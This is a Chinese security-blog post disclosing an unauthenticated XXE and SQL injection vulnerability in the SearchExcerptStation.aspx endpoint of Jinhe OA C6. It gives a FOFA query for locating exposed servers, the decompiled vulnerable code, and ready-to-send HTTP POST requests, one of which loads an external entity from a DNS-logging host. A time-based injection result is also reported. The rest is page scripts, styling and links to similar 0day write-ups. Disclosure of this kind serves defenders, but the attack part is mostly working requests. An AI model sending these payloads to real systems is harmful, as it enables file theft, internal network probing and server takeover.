---
title: "金和OA SearchExcerptStation.aspx XXE+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-SearchExcerptStation-xxe-sqli.html
asset_dir: assets/金和oa-searchexcerptstation.aspx-xxe+sql注入漏洞
---

# 金和OA SearchExcerptStation.aspx XXE+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/30 13:31
* 514浏览
* [0评论](#comment)
* 18分钟阅读

深入探索

SQL注入检测工具

授权

网页浏览器


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `SearchExcerptStation.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

SQL注入防护

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

技术文章订阅

Web安全书籍

文本剥离工具

直接根据 `SearchExcerptStation.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Appraise.dll` 将其进行反编译后找到 **SearchExcerptStation** 的处理逻辑

```
public class SearchExcerptStation : Page
{
  protected void Page_Load(object sender, EventArgs e)
  {
    this.Request.QueryString.ToString();
    string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.LoadXml(end);
    string innerText = xmlDocument.DocumentElement.ChildNodes.Item(0).InnerText;
    JHSoft.Appraise.AppraiseSet appraiseSet = new JHSoft.Appraise.AppraiseSet();
    string sql = string.Format("select distinct ApprSetID,StaName from appraiseSet a inner join Station b on (a.AppraiseStation=b.StaID) \r\nWhere a.DelFlag = 0 and AppraiseType='{0}' union\r\nselect distinct ApprSetID,StaName=Reg_Name from appraiseSet a inner join jhbj_register b on (a.regcode=b.reg_code) \r\nWhere a.DelFlag = 0 and AppraiseType='{0}'  order by StaName Asc", (object) innerText);
    DataTable dataTable = appraiseSet.BindList(sql);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

同时第一个节点的值被直接带入sql语句中执行，从而也造成了[sql注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.Appraise/SearchExcerptStation.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

代码安全审计

[![金和OA SearchExcerptStation.aspx XXE+SQL注入漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

## SQL

```
POST /c6/Jhsoft.Web.Appraise/SearchExcerptStation.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<root>
<node>SQLI_POC</node>
</root>
```

[![金和OA SearchExcerptStation.aspx XXE+SQL注入漏洞](images/img-002-e3461919b24f.webp)](https://image.mrxn.net/a7028574bfd34fc5b3fbbe171d2c5eb5.webp)

成延时 10 秒（执行两次）

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.XXE](#toc-5-1-)
* [5.2.SQL](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA SearchExcerptStation.aspx XXE+SQL注入漏洞](https://mrxn.net/jswz/jhsoft-SearchExcerptStation-xxe-sqli.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-SearchExcerptStation-xxe-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-SearchExcerptStation-xxe-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

编程

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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